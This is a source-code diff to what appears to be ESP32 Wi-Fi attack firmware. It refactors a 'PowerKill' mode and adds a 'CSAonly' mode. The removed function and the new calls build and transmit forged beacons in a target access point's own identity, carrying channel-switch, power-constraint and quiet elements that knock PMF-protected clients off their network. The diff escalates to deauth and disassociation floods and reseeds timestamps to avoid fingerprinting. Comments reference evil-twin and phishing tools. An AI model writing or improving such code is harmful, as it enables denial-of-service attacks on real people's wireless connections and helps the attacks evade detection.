@@ -1,4 +1,5 @@
 #include "svc_deauth.h"
+#include "pk_frame.h"
 #include "svc_target.h"
 #include "svc_wifi.h"
 #include "wsl_bypasser.h"
@@ -32,6 +33,11 @@ static beacon_ap_t s_pool[BEACON_POOL_MAX]; /* fake APs live this run */
 static int s_pool_count = 0;      /* entries actually beaconing */
 static uint32_t s_beacons = 0;    /* fake APs in the pool */
 static int s_channel = 1;         /* pinned channel, clamped 1..13 */
+/* CSA target: 0 = no survey yet, so pk_frame.c picks its own. A survey
+ * result makes the beacon steer the victim at a channel MEASURED to be empty
+ * rather than a guess - it previously always said 13, which is not reliably
+ * empty and made the whole CSA element a coin flip. */
+static int s_csa_channel;
 static int s_chan_cursor = 0;     /* beacon-mode hop cursor (0 -> hop to 1) */
 static int s_hop_left = 0;        /* ticks left before the next hop */
 static beacon_name_mode_t s_name_mode = BEACON_NAMES_COMMON;
@@ -68,110 +74,6 @@ static void build_deauth(uint8_t *f, const uint8_t bssid[6]) {
     memcpy(f, tpl, sizeof(tpl));
     memcpy(f + 10, bssid, 6);
     memcpy(f + 16, bssid, 6);
-}
-
-/* TPC / CSA / Quiet beacon carrying the TARGET'S OWN BSSID and SSID.
- *
- * From ESP32WifiPhisher's wifi_attack_deauth_client_negative_tx_power(),
- * which is what its Evil Twin uses INSTEAD of deauth - its beacon-spam call
- * sites are commented out while this one runs. It works where deauth does
- * not because beacons carry no 802.11w protection, so a PMF client that
- * discards a forged deauth will still act on this. Three lies, told in the
- * victim's own AP's voice:
- *   tag 7  Country   "US ", ceiling 30 dBm - REQUIRED, TPC is only legal
- *                    alongside a Country element
- *   tag 32 Power     constraint 30 -> client computes 30-30 = 0 dBm and
- *                    throttles its own uplink
- *   tag 37 CSA       mode 1, count 0 -> leave for another channel NOW
- *   tag 40 Quiet     duration 0xFFFF -> radio silence every beacon period
- *
- * Honest limits: Power Constraint compliance is stack-dependent and often
- * ignored; Quiet is a 5 GHz DFS mechanism and this is 2.4 GHz only, so
- * expect nothing from it. CSA (count 0) is the load-bearing element. */
-static int build_tpc_beacon(uint8_t *f, const uint8_t bssid[6],
-                            const char *ssid, int channel, int tick) {
-    static uint32_t tsf = 0;
-    static uint16_t seq = 0;
-    if (tsf == 0) {
-        tsf = esp_random() ? esp_random() : 0x10000000u;
-    }
-    tsf += 100 * 1024;
-    seq++;
-
-    int sl = 0;
-    while (ssid[sl] && sl < 32) {
-        sl++;
-    }
-
-    int o = 0;
-    f[o++] = 0x80;
-    f[o++] = 0x00;
-    f[o++] = 0x00;
-    f[o++] = 0x00;
-    memset(f + o, 0xff, 6); o += 6;   /* addr1 broadcast */
-    memcpy(f + o, bssid, 6);    o += 6;
-    memcpy(f + o, bssid, 6);    o += 6;
-    f[o++] = (uint8_t)(seq >> 4);
-    f[o++] = (uint8_t)((seq & 0xf) << 4);
-    for (int i = 0; i < 4; i++) {
-        f[o++] = (uint8_t)(tsf >> (8 * i));
-    }
-    for (int i = 0; i < 4; i++) {
-        f[o++] = 0x00;
-    }
-    f[o++] = 0x64;
-    f[o++] = 0x00;
-    f[o++] = 0x05;
-    f[o++] = 0x01;
-    f[o++] = 0x00;              /* SSID */
-    f[o++] = (uint8_t)sl;
-    memcpy(f + o, ssid, (size_t)sl);
-    o += sl;
-    f[o++] = 0x01;              /* Supported Rates */
-    f[o++] = 0x04;
-    f[o++] = 0x82; f[o++] = 0x84; f[o++] = 0x8B; f[o++] = 0x96;
-    f[o++] = 0x03;              /* DS Parameter */
-    f[o++] = 0x01;
-    f[o++] = (uint8_t)channel;
-    f[o++] = 0x07;              /* Country - required for TPC */
-    f[o++] = 0x06;
-    f[o++] = 'U'; f[o++] = 'S'; f[o++] = ' ';
-    f[o++] = 1;
-    f[o++] = 11;
-    f[o++] = 30;                /* max TX power 30 dBm */
-    /* Sweep the constraint: stacks that clamp the standard 30 get another
-     * value. The reference author's own note is "you can try 35". */
-    static const int8_t cons[3] = { 30, 35, 20 };
-    f[o++] = 0x20;              /* Power Constraint */
-    f[o++] = 0x01;
-    f[o++] = (uint8_t)cons[tick % 3];
-    f[o++] = 0x23;              /* TPC Report */
-    f[o++] = 0x02;
-    f[o++] = 30;
-    f[o++] = 0x00;
-    f[o++] = 0x25;              /* CSA */
-    f[o++] = 0x03;
-    f[o++] = 0x01;              /* mode 1: stop TX while switching */
-    f[o++] = (uint8_t)(channel == 13 ? 1 : 13);
-    f[o++] = 0x00;              /* count 0: switch immediately */
-    f[o++] = 0x28;              /* Quiet element */
-    f[o++] = 0x06;
-    f[o++] = 0x01;
-    f[o++] = 0x01;
-    f[o++] = 0xFF;
-    f[o++] = 0xFF;
-    f[o++] = 0x00;
-    f[o++] = 0x00;
-    /* RSN so the fake AP reads as real WPA2; a scanning client may otherwise
-     * discard the frame before looking at the IEs above. Marauder's. */
-    f[o++] = 0x30;
-    f[o++] = 0x18;
-    f[o++] = 0x01; f[o++] = 0x00;
-    f[o++] = 0x00; f[o++] = 0x0F; f[o++] = 0xAC; f[o++] = 0x04;
-    f[o++] = 0x02; f[o++] = 0x00; f[o++] = 0x0F; f[o++] = 0xAC; f[o++] = 0x04;
-    f[o++] = 0x01; f[o++] = 0x00; f[o++] = 0x00; f[o++] = 0x0F; f[o++] = 0xAC; f[o++] = 0x02;
-    f[o++] = 0x04; f[o++] = 0x01; f[o++] = 0x00; f[o++] = 0x00; f[o++] = 0x0F; f[o++] = 0xAC; f[o++] = 0x02;
-    return o;
 }
 
 static void build_disassoc(uint8_t *f, const uint8_t bssid[6]) {
@@ -363,14 +265,19 @@ static void tx_tick(void *arg) {
     uint8_t f[160];
     int ok_count = 0;
     esp_err_t err = ESP_OK;
-    if (s_mode == DEAUTH_MODE_POWERKILL) {
+    if (s_mode == DEAUTH_MODE_POWERKILL || s_mode == DEAUTH_MODE_CSA) {
         /* Phase A is the TPC beacon alone; it escalates to beacon +
          * deauth + disassoc so stacks that ignore CSA still get hit.
          * Phase is DERIVED from elapsed ticks, keeping this callback free
-         * of state mutations. */
-        int phase_b = (s_ticks >= (uint32_t)(POWERKILL_PHASE_A_S * 10));
-        int len = build_tpc_beacon(f, s_bssid, tgt_wifi_ssid(),
-                                   s_channel, (int)s_ticks);
+         * of state mutations. DEAUTH_MODE_CSA is the same beacon with the
+         * escalation removed, so measuring the two separately is the only
+         * way to tell whether CSA does anything on its own. */
+        int phase_b = (s_mode == DEAUTH_MODE_POWERKILL &&
+                       s_ticks >= (uint32_t)(POWERKILL_PHASE_A_S * 10));
+        int csa = s_csa_channel ? s_csa_channel
+                                : pk_csa_target_channel(s_channel);
+        int len = pk_build_tpc_beacon(f, s_bssid, tgt_wifi_ssid(),
+                                      s_channel, (int)s_ticks, csa);
         err = wsl_send_raw(f, len);
         if (err == ESP_OK) {
             ok_count++;
@@ -503,6 +410,10 @@ int svc_deauth_start(deauth_mode_t mode) {
     s_channel = ch;
     if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK)
         return -3;
+    /* Reseed the beacon TSF per launch so the clock does not carry across
+     * runs - a sequence counter that keeps counting after a reset is a
+     * trivial fingerprint. */
+    pk_frame_seed((uint32_t)esp_random());
     esp_err_t perr = probe_tx();
     s_beacon_ok = probe_subtype(0x80) == ESP_OK;
     if (perr != ESP_OK) {
@@ -653,6 +564,29 @@ int svc_deauth_follow_channel(int ch) {
     return ch;
 }
 
+/* CSA target channel, resolved for display. */
+int svc_deauth_set_csa_channel(int ch) {
+    if (ch < 1 || ch > 13) {
+        return -1;
+    }
+    /* Refuse to steer the victim onto the channel it is already on: the
+     * switch would be a no-op and would tell a client that this beacon is
+     * lying in a way that makes it ignore the rest. */
+    if (ch == s_channel) {
+        return -2;
+    }
+    s_csa_channel = ch;
+    return 0;
+}
+
+int svc_deauth_csa_channel(void) {
+    return s_csa_channel ? s_csa_channel : pk_csa_target_channel(s_channel);
+}
+
+int svc_deauth_csa_surveyed(void) {
+    return s_csa_channel != 0;
+}
+
 const char *svc_deauth_mode_name(deauth_mode_t m) {
     switch (m) {
         case DEAUTH_MODE_DEAUTH:   return "Deauth";
@@ -660,6 +594,7 @@ const char *svc_deauth_mode_name(deauth_mode_t m) {
         case DEAUTH_MODE_COMBINED: return "Deauth+Disassoc";
         case DEAUTH_MODE_BEACON:   return "BeaconSpam";
     case DEAUTH_MODE_POWERKILL: return "PowerKill";
+    case DEAUTH_MODE_CSA:  return "CSAonly";
         default:                   return "?";
     }
 }
